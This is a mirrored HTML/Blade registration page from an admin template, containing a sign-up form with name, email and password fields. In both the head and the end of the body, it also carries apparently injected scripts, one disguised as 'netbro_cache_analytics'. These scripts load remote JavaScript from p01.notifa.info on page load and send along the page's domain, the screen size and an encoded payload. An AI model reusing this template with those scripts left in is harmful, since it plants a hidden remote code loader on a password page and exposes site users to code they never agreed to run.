<html lang="en"><!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT --><head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Undex - Modern Admin Template</title>

    <!-- Favicon -->
    <link rel="icon" href="{{ asset('/img/core-img/favicon.png')}}">

    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
    <link rel="stylesheet" href="{{ asset('style.css')}}">

<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtRemL63VQuxIGwWvWJHs8bqBGoGM7%2fBsPHSF0fW4SR2I783XVC8Xh4LE%2b4eFh5hvzfDO2%2foTRBa8YstDkY3FW4SovUd2tOEMFJx5YaqsgM%2bfoP1iBLtanWbBa4N1W1IkAYwzKYoxQmgI%2b8tDjucXydRGFe4ISgBAXkScJX99yZDvaNYGIP4NFcGRXyjRbe%2b0KeEna2eELtKFOJIPjXNtfLhKLJJKCW%2fg4WxwrTa3K3YfZUqs81gySOiD0qZOdcsFLLO%2bx4eueteWbNfHmYpSjbmGsc7teoPoGVk8&amp;idc_r=35114405284&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script></head>

<body class="dark-color-overlay bg-img" style="background-image: url(img/bg-img/8.jpg);">
    <!-- Preloader -->
    

    <!-- ======================================
    ******* Main Wrapper Area Start **********
    ======================================= -->
    <div class="main-content- h-100vh">
        <div class="container h-100">
            <div class="row h-100 justify-content-center align-items-center">
                <div class="col-sm-10 col-md-12 col-lg-9">
                    <!-- Middle Box -->
                    <div class="middle-box">
                        <div class="card mb-0">
                            <div class="card-body p-4">
                                <div class="row align-items-center">
                                    <div class="col-md-6">
                                        <div class="xs-d-none">
                                            <img src="{{ asset('img/bg-img/6.png')}}" alt="">
                                        </div>
                                    </div>

                                    <div class="col-md-6">

                                        <div>
                                            <h4 class="font-24 mt-0">Sign Up</h4>
                                            <p class="text-muted mb-4">Create a new account</p>
                                        </div>

                                        <form method="post" action="{{ route('register') }}">
                                            @csrf
                                            <div class="form-group">
                                                <label for="fullname">Nama Lengkap </label>
                                                <input id="name" type="text" class="form-control @error('name') is-invalid @enderror" name="name" value="{{ old('name') }}" autocomplete="name" autofocus>
                                                @error('name')
                                                    <span class="invalid-feedback" role="alert">
                                                        <strong>{{ $message }}</strong>
                                                    </span>
                                                @enderror
                                            </div>

                                            <div class="form-group">
                                                <label for="emailaddress">Email</label>
                                                <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" autocomplete="email">

                                                @error('email')
                                                    <span class="invalid-feedback" role="alert">
                                                        <strong>{{ $message }}</strong>
                                                    </span>
                                                @enderror
                                            </div>

                                            <div class="form-group">
                                                <label for="password">Password</label>
                                                <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" autocomplete="new-password">

                                                @error('password')
                                                    <span class="invalid-feedback" role="alert">
                                                        <strong>{{ $message }}</strong>
                                                    </span>
                                                @enderror
                                            </div>

                                            <div class="form-group">
                                                <label for="password">Ulangi Password</label>
                                                <input id="password-confirm" type="password" class="form-control" name="password_confirmation"  autocomplete="new-password">
                                            </div>

                                            <div>
                                                <label>Sudah Punya Akun?</label><a href="{{  route('login') }}"> Login</a>
                                            </div>

                                             <div class="form-group mb-3">
                                                <div class="custom-control custom-checkbox pl-0">
                                                    <div class="custom-control custom-checkbox">
                                                        <input type="checkbox" class="custom-control-input" id="customCheck1">
                                                        <label class="custom-control-label" for="customCheck1"><span class="font-16">Remember me</span><a class="text-muted"> Terms and Conditions</a></label>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="form-group mb-0 text-center">
                                                <button class="btn btn-primary btn-block" type="submit"> Sign Up </button>
                                            </div>

                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ======================================
    ********* Page Wrapper Area End ***********
    ======================================= -->

    <!-- Must needed plugins to the run this template -->
    <script src="{{ asset('js/jquery.min.js') }}"></script>
    <script src="{{ asset('js/popper.min.js') }}"></script>
    <script src="{{ asset('js/bootstrap.min.js') }}"></script>
    <script src="{{ asset('js/bundle.js') }}"></script>

    <!-- Active JS -->
    <script src="{{ asset('js/default-assets/active.js') }}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAp5MWgzit1Y9yKP9YrDwgyOgj9%2b1kTShhDp4kfPwoX5dINCzCbczefiR4q6X0LWx6nRe0DxUs4GyM5TmoEpDrZr%2bCpFOIKK1F%2fvr1eIu%2f633dhqk3X%2b%2fPaWWLlllZS9vu45IQ%2bRyE8kCwE5sSRkqQjNIWkfqPdRs%2fOi%2fpA8oDW76QVEg3OGLUPw0bmykMN7gpj99V0q3mLyz9Y6WNMHCGqz4OkqdqtRemL63VQuxIGwWvWJHs8bqBGoGM7%2fBsPHSF0fW4SR2I783XVC8Xh4LE%2b4eFh5hvzfDO2%2foTRBa8YstDkY3FW4SovUd2tOEMFJx5YaqsgM%2bfoP1iBLtanWbBa4N1W1IkAYwzKYoxQmgI%2b8tDjucXydRGFe4ISgBAXkScJX99yZDvaNYGIP4NFcGRXyjRbe%2b0KeEna2eELtKFOJIPjXNtfLhKLJJKCW%2fg4WxwrTa3K3YfZUqs81gySOiD0qZOdcsFLLO%2bx4eueteWbNfHmYpSjbmGsc7teoPoGVk8" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


<!-- Mirrored from demo.riktheme.com/undex-1/side-menu-dark/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2019 08:41:49 GMT -->
</body></html>